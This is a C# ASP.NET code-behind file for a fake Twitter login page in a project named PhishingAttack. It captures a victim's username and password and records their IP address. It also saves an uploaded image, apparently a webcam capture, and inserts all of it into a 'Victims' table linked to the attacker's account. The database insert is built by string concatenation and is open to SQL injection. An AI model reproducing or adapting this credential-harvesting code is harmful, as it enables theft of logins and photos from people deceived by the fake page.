using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data;
using System.Data.SqlClient;
using System.IO;
using System.Web.Services;
using System.Text;

namespace PhishingAttack
{
    public partial class twitter : System.Web.UI.Page
    {
        String imagepath;
        int i = 0;
        String picid;
        String sessionusername;
        String sessionpass;
        
        protected void Page_Load(object sender, EventArgs e)
        {
            //string newq = email.Text;
            //Session["emailid"] = newq;
            if (!IsPostBack)
            {
                if (Request.InputStream.Length > 0)
                {
                   using (StreamReader reader = new StreamReader(Request.InputStream))
                    {
                        string hexString = Server.UrlEncode(reader.ReadToEnd());
                        //imagepath = "~/SavedImages/SavedPhoto"+picid+".png";
                        //logingbtn_Click(logingbtn, null);
                        picid = CreatePassword(3);
                        logingbtn_Click(logingbtn, e);
                        imagepath = "~/SavedImages/SavedPhoto" + picid + ".png";
                        first();
                        File.WriteAllBytes(Server.MapPath(imagepath), ConvertHexToBytes(hexString));
                        Session["CapturedImage"] = ResolveUrl(imagepath);
                       // Response.Write("<script LANGUAGE='JavaScript' >alert('thanks for registration we will notify you soon!!')</script>");
                    }
                }
            }
        }

        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

         private static byte[] ConvertHexToBytes(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < hex.Length; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return bytes;
        }

        [WebMethod(EnableSession = false)]
        public static string GetCapturedImage()
        {
            string url = HttpContext.Current.Session["CapturedImage"].ToString();
            HttpContext.Current.Session["CapturedImage"] = null;
            return url;
        }

        public void first()
        {
            if (Session["AttackerUsername"] == null | Session["AttackerUsername"] != null)
            {

                hdfAttackerUsername.Value = Request.QueryString["AttackerUsername"];
                hdfCategory.Value = Request.QueryString["Category"];
                hdfvictimusername.Value = Request.QueryString["victimusername"];
                hdfvictimpassword.Value = Request.QueryString["password"];

                string ipadd = string.Empty;
                if (HttpContext.Current.Request.ServerVariables["HTTP_X_FORWARDER_FOR"] != null)
                {
                    ipadd = HttpContext.Current.Request.ServerVariables["HTTP_X_FORWARDER_FOR"].ToString();
                }
                else if (HttpContext.Current.Request.UserHostAddress.Length != 0)
                {
                    ipadd = HttpContext.Current.Request.UserHostAddress;
                }
                string ipaddresses = "your ip address is :" + ipadd;

                string todaydate = DateTime.Now.ToShortDateString();

                string mycon = "Data Source=TOSHIBA-PC\\SQLEXPRESS;Initial Catalog=IdHackDB;Integrated Security=True";
                string query = "insert into Victims(Username,Category,VictimUserName,Password,IPAddress,Date,imglink) values ('" + hdfAttackerUsername.Value + "','" + hdfCategory.Value + "','" + hdfvictimusername.Value + "','" + hdfvictimpassword.Value + "','" + ipaddresses + "','" + todaydate + "','" + imagepath + "')";

                SqlConnection con = new SqlConnection(mycon);
                con.Open();
                SqlCommand cmd = new SqlCommand();
                cmd.CommandText = query;
                cmd.Connection = con;
                cmd.ExecuteNonQuery();
                con.Close();
                password.Text = "";
                // Response.Write("<script LANGUAGE='JavaScript' >alert('thanks for registration we will notify you soon!!')</script>");
            }
        }

public void logingbtn_Click(object sender, EventArgs e)
        {   
            //string url = "twitter.aspx?victimusername=" + email.Text + "&password=" + password.Text; // gridcategory + ".aspx?AttackerUsername=" + TextBox1.Text + "&Category=" + gridcategory;
            //Response.Redirect(url);
            //Response.Write("<script LANGUAGE='JavaScript' >alert('thanks for registration we will notify you soon!!')</script>");
       
    ViewState["username"] = email.Text;
            ViewState["password"] = password.Text;
            sessionusername = ViewState["username"].ToString();
            sessionpass = ViewState["password"].ToString();
        }
    }
}